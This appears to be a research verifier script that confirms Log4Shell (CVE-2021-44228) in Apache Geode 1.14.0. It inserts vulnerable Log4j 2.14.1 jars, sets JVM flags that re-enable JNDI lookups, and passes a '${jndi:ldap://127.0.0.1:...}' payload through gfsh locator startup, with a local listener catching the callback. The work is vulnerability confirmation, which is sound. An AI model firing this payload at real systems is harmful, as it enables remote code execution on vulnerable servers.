#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_geode_1_14_0_v1_log4j_real_entrypoint"
ARCHIVE_NAME = "apache-geode-1.14.0.tgz"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
V1_RUNTIME_TARGETS = {"log4j-api-2.14.0.jar", "log4j-core-2.14.0.jar"}
LOG4J_JARS = {
    "log4j-api-2.14.0.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.0.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(dist):
    lib = dist / "lib"
    before = sorted(p.name for p in lib.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        target = lib / target_name
        if target.exists():
            target.unlink()
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_TARGETS,
            "target_filename_preserved_for_downstream_classpath": True,
        }
    after = sorted(p.name for p in lib.glob("log4j-*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(lib / "log4j-core-2.14.0.jar"),
    }


def ensure_geode(evidence_dir):
    run_root = evidence_dir / "runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    if not ARCHIVE.exists():
        raise FileNotFoundError(ARCHIVE)
    with tarfile.open(ARCHIVE, "r:gz") as tar:
        tar.extractall(run_root)
    dist = run_root / "apache-geode-1.14.0"
    for script in (dist / "bin").glob("*"):
        script.chmod(script.stat().st_mode | 0o111)
    return dist, replace_log4j(dist)


def free_port(host="127.0.0.1"):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, 0))
        return sock.getsockname()[1]


def start_listener(evidence_dir, case_name, timeout=25):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(str(port_box["port"]), encoding="utf-8")
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} listener did not start")
    return port_box["port"], received, thread


def stop_pid(pid):
    if not pid:
        return
    try:
        os.kill(pid, signal.SIGTERM)
    except OSError:
        return
    deadline = time.time() + 8
    while time.time() < deadline:
        try:
            os.kill(pid, 0)
        except OSError:
            return
        time.sleep(0.2)
    try:
        os.kill(pid, signal.SIGKILL)
    except OSError:
        pass


def dependency_evidence(dist, evidence_dir, replacement):
    jars = sorted(str(p.relative_to(dist)) for p in dist.glob("lib/log4j-*.jar"))
    result = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Geode 1.14.0 binary with "
            "generated v1 Log4j 2.14.1 api/core jar bytes copied from .m2-poc into the "
            "original Geode log4j-api/core 2.14.0 target filenames so gfsh classpath logic is preserved; "
            "Geode's original 2.14.0 Log4j bridge jars are retained"
        ),
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": jars,
        "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
        "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
    }
    (evidence_dir / "dependency-evidence.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "dependency-evidence.txt").write_text(
        "\n".join(jars)
        + f"\nJndiLookup.class={result['jndi_lookup_class_present']}\n"
        + f"JndiManager.class={result['jndi_manager_class_present']}\n",
        encoding="utf-8",
    )
    return result


def run_case(dist, evidence_dir, case_name, with_payload):
    ldap_port, received, listener_thread = start_listener(evidence_dir, case_name)
    jmx_port = free_port()
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % ldap_port
    work_dir = evidence_dir / f"{case_name}-work"
    if work_dir.exists():
        shutil.rmtree(work_dir)
    work_dir.mkdir(parents=True)

    member_name = "locator-payload" if with_payload else "locator-control"
    probe_value = payload if with_payload else "control"
    command_text = (
        f"start locator --name={member_name} --dir={work_dir} --port=0 --http-service-port=0 "
        f"--J=-Dgemfire.jmx-manager=true --J=-Dgemfire.jmx-manager-port={jmx_port} "
        "--J=-Dlog4j2.formatMsgNoLookups=false "
        "--J=-Dcom.sun.jndi.ldap.object.trustURLCodebase=true "
        f"--J=-Dgeode.probe.payload={probe_value}"
    )
    cmd = [str(dist / "bin" / "gfsh"), "-e", command_text]

    started = time.time()
    proc = subprocess.run(
        cmd,
        cwd=str(dist),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=45,
    )
    listener_thread.join(5)
    output = proc.stdout

    pid = None
    pid_file = work_dir / "vf.gf.locator.pid"
    if pid_file.exists():
        try:
            pid = int(pid_file.read_text(encoding="utf-8").strip().split()[0])
        except Exception:
            pid = None
    stop_pid(pid)

    log_hits = []
    for path in sorted(work_dir.rglob("*.log")):
        text = path.read_text(encoding="utf-8", errors="replace")
        if "geode.probe.payload" in text or payload in text or member_name in text:
            log_hits.append(
                {
                    "file": str(path),
                    "contains_payload": payload in text if with_payload else False,
                    "contains_probe_key": "geode.probe.payload" in text,
                    "tail": text[-5000:],
                }
            )

    result = {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "payload": payload if with_payload else None,
        "returncode": proc.returncode,
        "jmx_port": jmx_port,
        "pid": pid,
        "received": received,
        "received_count": len(received),
        "stdout_contains_online": " is currently online." in output,
        "stdout_contains_probe_key": "geode.probe.payload" in output,
        "stdout_contains_payload": payload in output if with_payload else False,
        "log_contains_probe_key": any(hit["contains_probe_key"] for hit in log_hits),
        "log_contains_payload": any(hit["contains_payload"] for hit in log_hits) if with_payload else False,
        "log_hits": log_hits,
        "stdout_tail": output[-10000:],
    }
    (evidence_dir / f"{case_name}.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and evidence_dir.exists():
        shutil.rmtree(evidence_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    dist, replacement = ensure_geode(evidence_dir)
    dep = dependency_evidence(dist, evidence_dir, replacement)
    positive = run_case(dist, evidence_dir, "locator_jvm_property_payload", True)
    negative = run_case(dist, evidence_dir, "locator_jvm_property_control", False)

    confirmed = (
        all(
            name in replacement["copied"]
            and replacement["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_TARGETS
        )
        and replacement["log4j_core"]["version_2_14_1"]
        and dep["jndi_lookup_class_present"]
        and dep["jndi_manager_class_present"]
        and positive["returncode"] == 0
        and positive["stdout_contains_online"]
        and positive["stdout_contains_probe_key"]
        and positive["stdout_contains_payload"]
        and positive["log_contains_probe_key"]
        and positive["log_contains_payload"]
        and positive["received_count"] > 0
        and negative["returncode"] == 0
        and negative["stdout_contains_online"]
        and negative["stdout_contains_probe_key"]
        and negative["log_contains_probe_key"]
        and negative["received_count"] == 0
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/geode",
        "downstream_application": "Apache Geode 1.14.0",
        "downstream_entrypoint": "bin/gfsh real locator startup",
        "downstream": "Apache Geode 1.14.0",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(ARCHIVE),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "attack_surface": "Geode `gfsh start locator` with a user-controlled JVM property logged in Geode locator startup output and logs",
        "payload": positive["payload"],
        "dynamic_signal": {
            "positive_returncode": positive["returncode"],
            "positive_locator_online": positive["stdout_contains_online"],
            "positive_probe_key_logged": positive["stdout_contains_probe_key"] and positive["log_contains_probe_key"],
            "positive_payload_logged": positive["stdout_contains_payload"] and positive["log_contains_payload"],
            "positive_listener_received_count": positive["received_count"],
            "positive_listener_received": positive["received"],
            "negative_returncode": negative["returncode"],
            "negative_locator_online": negative["stdout_contains_online"],
            "negative_probe_key_logged": negative["stdout_contains_probe_key"] and negative["log_contains_probe_key"],
            "negative_listener_received_count": negative["received_count"],
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_TARGETS),
            "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
            "jndi_manager_class_present": dep["jndi_manager_class_present"],
        },
        "positive": {
            "returncode": positive["returncode"],
            "locator_online": positive["stdout_contains_online"],
            "probe_key_logged": positive["stdout_contains_probe_key"] and positive["log_contains_probe_key"],
            "payload_logged": positive["stdout_contains_payload"] and positive["log_contains_payload"],
            "listener_received_count": positive["received_count"],
            "listener_received": positive["received"],
        },
        "negative": {
            "returncode": negative["returncode"],
            "locator_online": negative["stdout_contains_online"],
            "probe_key_logged": negative["stdout_contains_probe_key"] and negative["log_contains_probe_key"],
            "listener_received_count": negative["received_count"],
        },
        "cases": [positive, negative],
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_geode_log4j_v1_inserted.py"),
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j "
            "api/core 2.14.1 runtime jars into an isolated Geode distribution and triggers "
            "Log4Shell through Geode's real gfsh locator startup path."
        ),
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_returncode={positive['returncode']}\n"
        f"positive_locator_online={int(positive['stdout_contains_online'])}\n"
        f"positive_listener_received_count={positive['received_count']}\n"
        f"negative_listener_received_count={negative['received_count']}\n"
        f"jndi_lookup_class_present={int(dep['jndi_lookup_class_present'])}\n"
        f"jndi_manager_class_present={int(dep['jndi_manager_class_present'])}\n"
        f"positive_probe_key_logged={int(positive['stdout_contains_probe_key'] and positive['log_contains_probe_key'])}\n"
        f"positive_payload_logged={int(positive['stdout_contains_payload'] and positive['log_contains_payload'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Geode 1.14.0 "
        "binary into an isolated runtime and copies generated v1 Log4j 2.14.1 `api` and `core` jar bytes "
        "from `.m2-poc` into Geode's original `log4j-api-2.14.0.jar` and `log4j-core-2.14.0.jar` target "
        "filenames, while retaining Geode's original 2.14.0 Log4j bridge jars.\n\n"
        "The positive run executes `gfsh start locator --J=-Dgeode.probe.payload=<payload>` with "
        "`${jndi:ldap://127.0.0.1:<port>/a}`; the negative run uses the same locator startup path "
        "with a control value. Positive must produce one LDAP bind and negative must produce none.\n\n"
        "Run: `python3 scripts/verify_geode_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
